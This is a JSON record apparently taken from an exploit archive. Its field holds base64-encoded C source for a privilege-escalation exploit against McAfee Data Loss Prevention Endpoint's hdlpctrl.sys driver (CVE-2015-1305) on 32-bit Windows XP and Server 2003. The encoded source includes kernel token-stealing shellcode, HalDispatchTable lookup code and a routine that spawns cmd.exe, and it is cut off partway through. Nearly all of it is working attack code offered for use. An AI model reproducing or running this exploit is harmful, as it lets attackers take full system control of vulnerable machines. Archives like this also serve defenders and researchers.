{
    "source": "exploit-database", 
    "exploit": "LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIE1jQWZlZSBEYXRhIExvc3MgUHJldmVudGlvbiBFbmRwb2ludCBBcmJpdHJhcnkgV3JpdGUgUHJpdmlsZWdlIEVzY2FsYXRpb24NCkRhdGUgICAgICAgICAgICAgLSAyOXRoIEphbnVhcnkgMjAxNQ0KRGlzY292ZXJlZCBieSAgICAtIFBhcnZleiBBbndhciAoQHBhcnZlemdoaCkNClZlbmRvciBIb21lcGFnZSAgLSBodHRwOi8vd3d3Lm1jYWZlZS5jb20NClRlc3RlZCBWZXJzaW9uICAgLSA5LjMuMjAwLjIzDQpEcml2ZXIgVmVyc2lvbiAgIC0gOS4zLjIwMC4yMyAtIGhkbHBjdHJsLnN5cw0KVGVzdGVkIG9uIE9TICAgICAtIDMyYml0IFdpbmRvd3MgWFAgU1AzIGFuZCBXaW5kb3dzIDIwMDMgU2VydmVyIFNQMg0KT1NWREIgICAgICAgICAgICAtIGh0dHA6Ly93d3cub3N2ZGIub3JnL3Nob3cvb3N2ZGIvMTE3MzQ1DQpDVkUgSUQgICAgICAgICAgIC0gQ1ZFLTIwMTUtMTMwNQ0KVmVuZG9yIGZpeCB1cmwgICAtIGh0dHBzOi8va2MubWNhZmVlLmNvbS9jb3Jwb3JhdGUvaW5kZXg/cGFnZT1jb250ZW50JmlkPVNCMTAwOTcNCkZpeGVkIHZlcnNpb24gICAgLSA5LjMuNDAwDQpGaXhlZCBkcml2ZXIgdmVyIC0gDQoNCiovDQoNCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8d2luZG93cy5oPg0KDQojZGVmaW5lIEJVRlNJWkUgNDA5Ng0KDQoNCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIHsNCiAgICAgUFZPSUQgICBVbmtub3duMTsNCiAgICAgUFZPSUQgICBVbmtub3duMjsNCiAgICAgUFZPSUQgICBCYXNlOw0KICAgICBVTE9ORyAgIFNpemU7DQogICAgIFVMT05HICAgRmxhZ3M7DQogICAgIFVTSE9SVCAgSW5kZXg7DQogICAgIFVTSE9SVCAgTmFtZUxlbmd0aDsNCiAgICAgVVNIT1JUICBMb2FkQ291bnQ7DQogICAgIFVTSE9SVCAgUGF0aExlbmd0aDsNCiAgICAgQ0hBUiAgICBJbWFnZU5hbWVbMjU2XTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZOw0KIA0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gew0KICAgICBVTE9ORyAgIENvdW50Ow0KICAgICBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIE1vZHVsZVsxXTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OOw0KDQp0eXBlZGVmIGVudW0gX1NZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyB7IA0KICAgICBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiA9IDExLA0KICAgICBTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiA9IDE2DQp9IFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUzsNCg0KdHlwZWRlZiBOVFNUQVRVUyAoV0lOQVBJICpfTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKSgNCiAgICAgU1lTVEVNX0lORk9STUFUSU9OX0NMQVNTIFN5c3RlbUluZm9ybWF0aW9uQ2xhc3MsDQogICAgIFBWT0lEIFN5c3RlbUluZm9ybWF0aW9uLA0KICAgICBVTE9ORyBTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aCwNCiAgICAgUFVMT05HIFJldHVybkxlbmd0aCk7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlJbnRlcnZhbFByb2ZpbGUpKA0KICAgICBEV09SRCBQcm9maWxlU291cmNlLCANCiAgICAgUFVMT05HIEludGVydmFsKTsNCg0KdHlwZWRlZiB2b2lkICgqRlVOQ1RQVFIpKCk7IA0KDQoNCg0KLy8gV2luZG93cyBYUCBTUDMNCg0KI2RlZmluZSBYUF9LUFJPQ0VTUyAweDQ0ICAgICAgLy8gT2Zmc2V0IHRvIF9LUFJPQ0VTUyBmcm9tIGEgX0VUSFJFQUQgc3RydWN0DQojZGVmaW5lIFhQX1RPS0VOICAgIDB4YzggICAgICAvLyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9VUElEICAgICAweDg0ICAgICAgLy8gT2Zmc2V0IHRvIFVuaXF1ZVByb2Nlc3NJZCBGUk9NIHRoZSBfRVBST0NFU1Mgc3RydWN0DQojZGVmaW5lIFhQX0FQTElOS1MgIDB4ODggICAgICAvLyBPZmZzZXQgdG8gQWN0aXZlUHJvY2Vzc0xpbmtzIF9FUFJPQ0VTUyBzdHJ1Y3QNCg0KLy8gV2luZG93cyBTZXJ2ZXIgMjAwMw0KDQojZGVmaW5lIFcySzNfS1BST0NFU1MgMHgzOCAgICAgIC8vIE9mZnNldCB0byBfS1BST0NFU1MgZnJvbSBhIF9FVEhSRUFEIHN0cnVjdA0KI2RlZmluZSBXMkszX1RPS0VOICAgIDB4ZDggICAgICAvLyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBXMkszX1VQSUQgICAgIDB4OTQgICAgICAvLyBPZmZzZXQgdG8gVW5pcXVlUHJvY2Vzc0lkIEZST00gdGhlIF9FUFJPQ0VTUyBzdHJ1Y3QNCiNkZWZpbmUgVzJLM19BUExJTktTICAweDk4ICAgICAgLy8gT2Zmc2V0IHRvIEFjdGl2ZVByb2Nlc3NMaW5rcyBfRVBST0NFU1Mgc3RydWN0DQoNCg0KQllURSB0b2tlbl9zdGVhbF94cFtdID0NCnsNCiAgMHg1MiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWR4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVkeCBvbiB0aGUgc3RhY2sNCiAgMHg1MywJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWJ4ICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVieCBvbiB0aGUgc3RhY2sNCiAgMHgzMywweGMwLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHhvciBlYXgsIGVheCAgICAgICAgICAgICAgICAgICBlYXggPSAwDQogIDB4NjQsMHg4YiwweDgwLDB4MjQsMHgwMSwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBmczpbZWF4KzEyNGhdICAgICAgICAgUmV0cmlldmUgRVRIUkVBRA0KICAweDhiLDB4NDAsWFBfS1BST0NFU1MsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgW2VheCtYUF9LUFJPQ0VTU10gICAgIFJldHJpZXZlIF9LUFJPQ0VTUw0KICAweDhiLDB4YzgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVjeCwgZWF4DQogIDB4OGIsMHg5OCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWJ4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VODQogIDB4OGIsMHg4MCxYUF9BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0FQTElOS1NdIDwtfCAgUmV0cmlldmUgRkxJTksgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGU4LFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIHN1YiBlYXgsIFhQX0FQTElOS1MgICAgICAgICB8ICBSZXRyaWV2ZSBfRVBST0NFU1MgUG9pbnRlciBmcm9tIHRoZSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGI4LFhQX1VQSUQsMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsMHgwMCwgIC8vIGNtcCBbZWF4K1hQX1VQSURdLCA0ICAgICAgICB8ICBDb21wYXJlcyBVbmlxdWVQcm9jZXNzSWQgd2l0aCA0IChTeXN0ZW0gUHJvY2VzcykNCiAgMHg3NSwweGU4LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGpuZSAgICAgICAgICAgICAgICAgICAgIC0tLS0gDQogIDB4OGIsMHg5MCxYUF9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWR4LCBbZWF4K1hQX1RPS0VOXSAgICAgICAgUmV0cmlldmVzIFRPS0VOIGFuZCBzdG9yZXMgb24gRURYDQogIDB4OGIsMHhjMSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBlY3ggICAgICAgICAgICAgICAgICAgUmV0cmlldmVzIEtQUk9DRVNTIHN0b3JlZCBvbiBFQ1gNCiAgMHg4OSwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBbZWF4K1hQX1RPS0VOXSwgZWR4ICAgICAgICBPdmVyd3JpdGVzIHRoZSBUT0tFTiBmb3IgdGhlIGN1cnJlbnQgS1BST0NFU1MNCiAgMHg1YiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlYnggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlYngNCiAgMHg1YSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlZHggICAgICAgICAgICAgICAgICAgICAgICBSZXN0b3JlcyBlZHgNCiAgMHhjMiwweDA4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHJldCA4ICAgIA0KfTsNCg0KDQpCWVRFIHRva2VuX3N0ZWFsX3cyazNbXSA9DQp7DQogIDB4NTIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBwdXNoIGVkeCAgICAgICAgICAgICAgICAgICAgICAgICBTYXZlIGVkeCBvbiB0aGUgc3RhY2sNCiAgMHg1MywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHB1c2ggZWJ4ICAgICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWJ4IG9uIHRoZSBzdGFjaw0KICAweDMzLDB4YzAsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8geG9yIGVheCwgZWF4ICAgICAgICAgICAgICAgICAgICAgZWF4ID0gMA0KICAweDY0LDB4OGIsMHg4MCwweDI0LDB4MDEsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgZnM6W2VheCsxMjRoXSAgICAgICAgICAgUmV0cmlldmUgRVRIUkVBRA0KICAweDhiLDB4NDAsVzJLM19LUFJPQ0VTUywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgW2VheCtXMkszX0tQUk9DRVNTXSAgICAgUmV0cmlldmUgX0tQUk9DRVNTDQogIDB4OGIsMHhjOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWN4LCBlYXgNCiAgMHg4YiwweDk4LFcySzNfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYngsIFtlYXgrVzJLM19UT0tFTl0gICAgICAgIFJldHJpZXZlcyBUT0tFTg0KICAweDhiLDB4ODAsVzJLM19BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgLy8gbW92IGVheCwgW2VheCtXMkszX0FQTElOS1NdIDwtfCAgUmV0cmlldmUgRkxJTksgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgMHg4MSwweGU4LFcySzNfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgIC8vIHN1YiBlYXgsIFcySzNfQVBMSU5LUyAgICAgICAgIHwgIFJldHJpZXZlIF9FUFJPQ0VTUyBQb2ludGVyIGZyb20gdGhlIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4YjgsVzJLM19VUElELDB4MDAsMHgwMCwweDAwLDB4MDQsMHgwMCwweDAwLDB4MDAsLy8gY21wIFtlYXgrVzJLM19VUElEXSwgNCAgICAgICAgfCAgQ29tcGFyZXMgVW5pcXVlUHJvY2Vzc0lkIHdpdGggNCAoU3lzdGVtIFByb2Nlc3MpDQogIDB4NzUsMHhlOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBqbmUgICAgICAgICAgICAgICAgICAgICAgIC0tLS0gDQogIDB4OGIsMHg5MCxXMkszX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWR4LCBbZWF4K1cySzNfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4gYW5kIHN0b3JlcyBvbiBFRFgNCiAgMHg4YiwweGMxLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGVjeCAgICAgICAgICAgICAgICAgICAgIFJldHJpZXZlcyBLUFJPQ0VTUyBzdG9yZWQgb24gRUNYDQogIDB4ODksMHg5MCxXMkszX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAvLyBtb3YgW2VheCtXMkszX1RPS0VOXSwgZWR4ICAgICAgICBPdmVyd3JpdGVzIHRoZSBUT0tFTiBmb3IgdGhlIGN1cnJlbnQgS1BST0NFU1MNCiAgMHg1YiwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHBvcCBlYnggICAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVieA0KICAweDVhLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVkeCAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdG9yZXMgZWR4DQogIDB4YzIsMHgwOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyByZXQgOCAgICAgICAgICAgICAgICAgICAgICAgICAgICBBd2F5IGZyb20gdGhlIGtlcm5lbA0KfTsNCg0KDQoNCkRXT1JEIEhhbERpc3BhdGNoVGFibGVBZGRyZXNzKCkgDQp7DQogICAgX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb247DQogICAgUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gICBwTW9kdWxlSW5mbzsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgIEhhbERpc3BhdGNoVGFibGU7DQogICAgQ0hBUiAgICAgICAgICAgICAgICAgICAgICAgICBrRnVsbE5hbWVbMjU2XTsNCiAgICBQVk9JRCAgICAgICAgICAgICAgICAgICAgICAgIGtCYXNlID0gTlVMTDsNCiAgICBMUFNUUiAgICAgICAgICAgICAgICAgICAgICAgIGtOYW1lOw0KICAgIEhNT0RVTEUgICAgICAgICAgICAgICAgICAgICAgS2VybmVsOw0KICAgIEZVTkNUUFRSICAgICAgICAgICAgICAgICAgICAgSGFsOw0KICAgIFVMT05HICAgICAgICAgICAgICAgICAgICAgICAgbGVuOw0KICAgIE5UU1RBVFVTICAgICAgICAgICAgICAgICAgICAgc3RhdHVzOw0KDQoNCiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSAoX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbilHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQogCQ0KICAgIGlmICghTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVW5hYmxlIHRvIHJlc29sdmUgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIE5VTEwsIDAsICZsZW4pOw0KDQogICAgaWYgKCFzdGF0dXMpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJlZCB3aGlsZSByZWFkaW5nIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbi4gU3RhdHVzID0gMHglMDh4XG5cbiIsIHN0YXR1cyk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoJCQ0KICAgIHBNb2R1bGVJbmZvID0gKFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OKUdsb2JhbEFsbG9jKEdNRU1fWkVST0lOSVQsIGxlbik7DQoNCiAgICBpZihwTW9kdWxlSW5mbyA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJyZWQgd2l0aCBHbG9iYWxBbGxvYyBmb3IgcE1vZHVsZUluZm9cblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIHBNb2R1bGVJbmZvLCBsZW4sICZsZW4pOw0KCQ0KICAgIG1lbXNldChrRnVsbE5hbWUsIDB4MDAsIHNpemVvZihrRnVsbE5hbWUpKTsNCiAgICBzdHJjcHlfcyhrRnVsbE5hbWUsIHNpemVvZihrRnVsbE5hbWUpLTEsIHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uSW1hZ2VOYW1lKTsNCiAgICBrQmFzZSA9IHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uQmFzZTsNCg0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBiYXNlIG5hbWUgJXNcbiIsIGtGdWxsTmFtZSk7DQogICAga05hbWUgPSBzdHJyY2hyKGtGdWxsTmFtZSwgJ1xcJyk7DQoNCiAgICBLZXJuZWwgPSBMb2FkTGlicmFyeUEoKytrTmFtZSk7DQoNCiAgICBpZihLZXJuZWwgPT0gTlVMTCkgDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gbG9hZCBrZXJuZWwgYmFzZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIEhhbCA9IChGVU5DVFBUUilHZXRQcm9jQWRkcmVzcyhLZXJuZWwsICJIYWxEaXNwYXRjaFRhYmxlIik7DQoNCiAgICBpZihIYWwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBmaW5kIEhhbERpc3BhdGNoVGFibGVcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgDQogICAgcHJpbnRmKCJbaV0gSGFsRGlzcGF0Y2hUYWJsZSBhZGRyZXNzIDB4JTA4eFxuIiwgSGFsKTsJDQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGhhbmRsZSAweCUwOHhcbiIsIEtlcm5lbCk7DQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGJhc2UgYWRkcmVzcyAweCUwOHhcbiIsIGtCYXNlKTsgICAgICAgICAgDQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlID0gKChEV09SRClIYWwgLSAoRFdPUkQpS2VybmVsICsgKERXT1JEKWtCYXNlKTsNCg0KICAgIHByaW50ZigiWytdIEtlcm5lbCBhZGRyZXNzIG9mIEhhbERpc3BhdGNoVGFibGUgMHglMDh4XG4iLCBIYWxEaXNwYXRjaFRhYmxlKTsNCg0KICAgIGlmKCFIYWxEaXNwYXRjaFRhYmxlKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGNhbGN1bGF0ZSBIYWxEaXNwYXRjaFRhYmxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcmV0dXJuIEhhbERpc3BhdGNoVGFibGU7DQp9DQoNCg0KaW50IEdldFdpbmRvd3NWZXJzaW9uKCkNCnsNCiAgICBpbnQgdiA9IDA7DQogICAgRFdPUkQgdmVyc2lvbiA9IDAsIG1pblZlcnNpb24gPSAwLCBtYWpWZXJzaW9uID0gMDsNCg0KICAgIHZlcnNpb24gPSBHZXRWZXJzaW9uKCk7DQoNCiAgICBtaW5WZXJzaW9uID0gKERXT1JEKShISUJZVEUoTE9XT1JEKHZlcnNpb24pKSk7DQogICAgbWFqVmVyc2lvbiA9IChEV09SRCkoTE9CWVRFKExPV09SRCh2ZXJzaW9uKSkpOw0KDQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAxOyAgLy8gIldpbmRvd3MgWFA7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDYpIHYgPSAyOyAgLy8gIldpbmRvd3MgNyI7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMiAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAzOyAgLy8gIldpbmRvd3MgU2VydmVyIDIwMDM7DQoNCiAgICByZXR1cm4gdjsNCn0NCg0KDQp2b2lkIHNwYXduU2hlbGwoKQ0Kew0KICAgIFNUQVJUVVBJTkZPQSBzaTsNCiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOw0KDQoNCiAgICBaZXJvTWVtb3J5KCZwaSwgc2l6ZW9mKHBpKSk7DQogICAgWmVyb01lbW9yeSgmc2ksIHNpemVvZihzaSkpOw0KICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsNCg0KICAgIHNpLmNiICAgICAgICAgID0gc2l6ZW9mKHNpKTsgDQogICAgc2kuZHdGbGFncyAgICAgPSBTVEFSVEZfVVNFU0hPV1dJTkRPVzsNCiAgICBzaS53U2hvd1dpbmRvdyA9IFNXX1NIT1dOT1JNQUw7DQoNCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3MoTlVMTCwgImNtZC5leGUiLCBOVUxMLCBOVUxMLCBUUlVFLCBDUkVBVEVfTkVXX0NPTlNPTEUsIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkNCiAgICB7DQogICAgICAgIHByaW50ZigiXG5bLV0gQ3JlYXRlUHJvY2VzcyBmYWlsZWQgKCVkKVxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsNCiAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7DQp9DQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkgDQp7DQoNCiAgICBfTnRRdWVyeUludGVydmFsUHJvZmlsZSAgICAgTnRRdWVyeUludGVydmFsUHJvZmlsZTsNCiAgICBMUFZPSUQgICAgICAgICAgICAgICAgICAgICAgaW5wdXRbMV0gPSB7MH07ICAgDQogICAgTFBWT0lEICAgICAgICAgICAgICAgICAgICAgIGFkZHJ0b3NoZWxsOw0KICAgIEhBTkRMRSAgICAgICAgICAgICAgICAgICAgICBoRGV2aWNlOw0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICBkd1JldEJ5dGVzID0gMDsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldDsgICAgICAgICAgICAgDQogICAgVUxPTkcgICAgICAgICAgICAgICAgICAgICAgIHRpbWUgPSAwOw0KICAgIHVuc2lnbmVkIGNoYXIgICAgICAgICAgICAgICBkZXZoYW5kbGVbTUFYX1BBVEhdOyANCg0KDQoNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiIpOw0KICAgIHByaW50ZigiTWNBZmVlIERhdGEgTG9zcyBQcmV2ZW50aW9uIEVuZHBvaW50IChoZGxwY3RybC5zeXMpIEFyYml0cmFyeSBXcml0ZSBFb1AgRXhwbG9pdFxuIik7DQogICAgcHJpbnRmKCIgICAgICAgICAgIFRlc3RlZCBvbiBXaW5kb3dzIFhQIFNQMy9XaW5kb3dzIFNlcnZlciAyMDAzIFNQMiAoMzJiaXQpICAgICAgICAgICAgXG4iKTsNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoNCg0KICAgIGlmIChHZXRXaW5kb3dzVmVyc2lvbigpID09IDEpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbaV0gUnVubmluZyBXaW5kb3dzIFhQXG4iKTsNCiAgICB9DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAzKSANCiAgICB7DQogICAgICAgIHByaW50ZigiW2ldIFJ1bm5pbmcgV2luZG93cyBTZXJ2ZXIgMjAwM1xuIik7DQogICAgfQ0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMCkgDQogICAgew0KICAgICAgICBwcmludGYoIltpXSBFeHBsb2l0IG5vdCBzdXBwb3J0ZWQgb24gdGhpcyBPU1xuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0gIA0KDQogICAgc3ByaW50ZihkZXZoYW5kbGUsICJcXFxcLlxcJXMiLCAiZGV2YmtjdHJsIik7DQoNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlID0gKF9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKUdldFByb2NBZGRyZXNzKEdldE1vZHVsZUhhbmRsZSgibnRkbGwuZGxsIiksICJOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlIik7DQogCQ0KICAgIGlmICghTnRRdWVyeUludGVydmFsUHJvZmlsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFVuYWJsZSB0byByZXNvbHZlIE50UXVlcnlJbnRlcnZhbFByb2ZpbGVcblxuIik7DQogICAgICAgIHJldHVybiAtMTsgIA0KICAgIH0NCiAgIA0KICAgIGFkZHJ0b3NoZWxsID0gVmlydHVhbEFsbG9jKE5VTEwsIEJVRlNJWkUsIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQoNCiAgICBpZihhZGRydG9zaGVsbCA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVmlydHVhbEFsbG9jIGFsbG9jYXRpb24gZmFpbHVyZSAlLjh4XG5cbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBwcmludGYoIlsrXSBWaXJ0dWFsQWxsb2MgYWxsb2NhdGVkIG1lbW9yeSBhdCAweCUuOHhcbiIsIGFkZHJ0b3NoZWxsKTsNCg0KICAgIG1lbXNldChhZGRydG9zaGVsbCwgMHg5MCwgQlVGU0laRSk7DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAxKSANCiAgICB7DQogICAgICAgIG1lbWNweShhZGRydG9zaGVsbCwgdG9rZW5fc3RlYWxfeHAsIHNpemVvZih0b2tlbl9zdGVhbF94cCkpOw0KICAgICAgICBwcmludGYoIltpXSBTaXplIG9mIHNoZWxsY29kZSAlZCBieXRlc1xuIiwgc2l6ZW9mKHRva2VuX3N0ZWFsX3hwKSk7DQogICAgfQ0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMykgDQogICAgew0KICAgICAgICBtZW1jcHkoYWRkcnRvc2hlbGwsIHRva2VuX3N0ZWFsX3cyazMsIHNpemVvZih0b2tlbl9zdGVhbF93MmszKSk7DQogICAgICAgIHByaW50ZigiW2ldIFNpemUgb2Ygc2hlbGxjb2RlICVkIGJ5dGVzXG4iLCBzaXplb2YodG9rZW5fc3RlYWxfdzJrMykpOw0KICAgIH0NCg0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9S